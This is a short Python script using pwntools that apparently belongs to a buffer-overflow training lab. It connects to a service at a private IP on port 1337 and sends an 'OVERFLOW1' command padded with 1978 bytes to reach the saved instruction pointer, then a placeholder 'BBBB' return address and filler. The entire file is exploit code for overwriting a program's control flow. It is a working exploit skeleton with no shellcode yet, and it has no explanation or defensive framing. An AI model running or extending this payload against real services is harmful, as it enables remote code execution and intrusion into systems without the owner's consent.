#!/usr/bin/env python3
from pwn import *

host = "10.10.116.72"
port = 1337
s = remote(host, port)
total_length = 3000
offset = 1978
new_eip = b"BBBB"


payload = [
    b"OVERFLOW1 ",
    b"A" * offset,
    new_eip,
    b"C" * (total_length - offset - len(new_eip)),
]

payload = b"".join(payload)
s.send(payload)
s.close()